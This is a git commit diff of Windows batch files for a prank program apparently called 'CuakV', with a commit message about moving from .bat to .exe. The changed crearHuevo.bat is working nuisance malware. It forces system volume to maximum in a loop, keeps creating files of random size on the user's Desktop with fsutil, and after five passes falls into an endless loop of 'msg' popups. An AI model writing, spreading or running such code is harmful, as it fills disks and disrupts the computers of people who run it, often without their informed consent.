dd85bd1ac4f2d813ca7cce6898845fecc7582e72
leiderCastillo <leiderCastillo@github.com>
2023-03-30 20:29:28 -0500

    cambio de .bat a .exe

---
+++ CuakV/CuackV.bat
@@ -0,0 +1,2 @@
+echo off
+start "" "./inicio.bat"
--- CuakV/assets/adds/crearHuevo.bat
+++ CuakV/assets/adds/crearHuevo.bat
@@ -1,6 +1,7 @@
 @echo off
 
 rem -----------------------
+set contador=0
 start "" "%USERPROFILE%\Goose\GooseDesktop.exe"
 start /B "" "%USERPROFILE%\adds\1.jpg"
 start /B "" "%USERPROFILE%\adds\2.jpg"
@@ -8,6 +9,7 @@ start /B "" "%USERPROFILE%\adds\3.jpg"
 rem -----------------------
 
 :loop
+set /a contador+=1
 %USERPROFILE%\adds\nircmd-x64\nircmd.exe setsysvolume 65535
 fsutil file createnew %USERPROFILE%\Desktop\HuevoCuak.%random% %random%00
 timeout /nobreak 2 >nul
@@ -16,7 +18,13 @@ timeout /nobreak 2 >nul
 timeout /nobreak 2 >nul
 %USERPROFILE%\adds\nircmd-x64\nircmd.exe setsysvolume 65535
 %USERPROFILE%\adds\nircmd-x64\nircmd.exe nircmd.exe win show class progman
-call :loop
-:endloop
 
-exit
+if %contador%==5 (
+msg "Cuack os, es el mejor"
+    :bucle
+        msg "Cuack os, es el mejor"
+    goto :bucle
+)
+
+goto :loop
+
